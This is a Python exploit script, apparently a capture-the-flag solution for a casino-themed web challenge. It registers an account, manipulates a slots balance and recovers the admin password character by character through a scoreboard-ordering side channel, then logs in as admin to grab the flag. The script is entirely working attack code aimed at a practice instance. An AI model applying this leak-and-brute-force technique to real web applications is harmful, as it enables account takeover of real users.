exploit.py
```py
import requests
from bs4 import BeautifulSoup
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

BASE_URL = 'https://boilerscasino-0ee68f48b34a9532.instancer.b01lersc.tf/'

session = requests.Session()


def login(username, password):
    url = f'{BASE_URL}/login'
    data = {'username': username, 'password': password}
    response = session.post(url, json=data, verify=False)
    return response.json()


def register(fullname, username, password):
    url = f'{BASE_URL}/register'
    data = {'fullname': fullname, 'username': username, 'password': password}
    response = session.post(url, json=data, verify=False)
    return response.json()


def scoreboard():
    url = f'{BASE_URL}/scoreboard'
    response = session.get(url, verify=False)
    return response.text


def slots(jwt_token, change):
    url = f'{BASE_URL}/slots'
    data = {'change': change}
    cookies = dict(jwt=jwt)
    response = session.post(url, json=data, cookies=cookies, verify=False)
    return response.text


def change_password(jwt_token, new_password):
    url = f'{BASE_URL}/update_password'
    data = {'new_password': new_password}
    cookies = dict(jwt=jwt)
    response = session.post(url, json=data, cookies=cookies, verify=False)
    return response.json()


def grab_flag(jwt_token):
    url = f'{BASE_URL}/grab_flag'
    cookies = dict(jwt=jwt)
    response = session.get(url, cookies=cookies, verify=False)
    return response.json()


name = "OUXS"
register("Captain Baccarat", name, "0"*64)
jwt = login(name, "0"*64)["jwt"]
slots(jwt,1000000-500)

pwd = ""
chars = "0123456789abcdef"
for i in range(64):
    for c in chars:
        pwd = pwd[:i] + c + "0"*(64-i-1)
        print(pwd)
        change_password(jwt, pwd)
        scb = scoreboard()

        soup = BeautifulSoup(scb, 'html.parser')
        td_tags = soup.find_all('td')
        td_contents = [td.get_text() for td in td_tags]
        print(td_contents)
        if td_contents[0] == "Captain Baccarat":
            pwd = pwd[:i] + chars[chars.index(c)-1]
            print(pwd)
            break
jwt = login("admin", pwd)["jwt"]

print(grab_flag(jwt))
```